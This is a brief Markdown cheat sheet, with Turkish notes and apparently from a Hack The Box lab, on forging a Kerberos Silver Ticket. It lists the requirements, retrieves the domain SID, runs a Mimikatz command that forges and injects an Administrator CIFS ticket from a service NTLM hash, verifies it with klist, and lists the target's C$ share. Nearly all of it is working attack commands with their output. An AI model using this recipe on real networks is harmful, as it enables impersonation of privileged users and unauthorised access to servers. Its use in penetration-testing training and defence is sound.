# Silver Ticket

## Some Considerations

* DC etkileşimi gerekli değildir.
* Kapsamı, hedeflenen servis hesabı ile sınırlıdır.
* Az gürültülüdür.

## Requirements

* Taklit edilecek kullanıcı adı.
* Domain.
* Domain SID.
* Servis hesabına ait NTLM hash.
* SPN.

## Retrieving Domain SID

```pwsh
PS C:\Users\htb-student> Get-DomainSID
```

```output title="Output"
S-1-5-21-1870146311-1183348186-593267556
```

## Forging the Silver Ticket (TGS Ticket)

!!! warning

    Mimikatz gümüş bilet yerine altın bilet ifadesini kullanır.

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe "kerberos::golden /ptt /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027C6604526B7B16A22E320B76E54A5B /service:cifs /target:SQL01.INLANEFREIGHT.LOCAL /renewmax:7 /endin:8" exit
```

```output title="Output" hl_lines="1-3 6-7 18"
User      : Administrator
Domain    : INLANEFREIGHT.LOCAL (INLANEFREIGHT)
SID       : S-1-5-21-1870146311-1183348186-593267556
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 027c6604526b7b16a22e320b76e54a5b - rc4_hmac_nt
Service   : cifs
Target    : SQL01.INLANEFREIGHT.LOCAL
Lifetime  : 1/29/2025 12:12:50 PM ; 1/29/2025 12:20:50 PM ; 1/29/2025 12:19:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ INLANEFREIGHT.LOCAL' successfully submitted for current session
```

## Verifying the Ticket

```pwsh
PS C:\Users\htb-student> klist
```

```output title="Output" hl_lines="5-6"
Current LogonId is 0:0x7fff1

Cached Tickets: (1)

#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
        Server: cifs/SQL01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 1/29/2025 12:12:50 (local)
        End Time:   1/29/2025 12:20:50 (local)
        Renew Time: 1/29/2025 12:19:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

## Listing Directory Contents

```pwsh
PS C:\Users\htb-student> dir \\SQL01.INLANEFREIGHT.LOCAL\C$
```

```output title="Output"
    Directory: \\SQL01.INLANEFREIGHT.LOCAL\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---       10/14/2022   7:52 AM                Program Files
d-----       10/14/2022   7:52 AM                Program Files (x86)
d-----        4/12/2023   3:13 PM                Tools
d-r---        4/12/2023   3:14 PM                Users
d-----        4/12/2023   2:16 PM                Windows
```
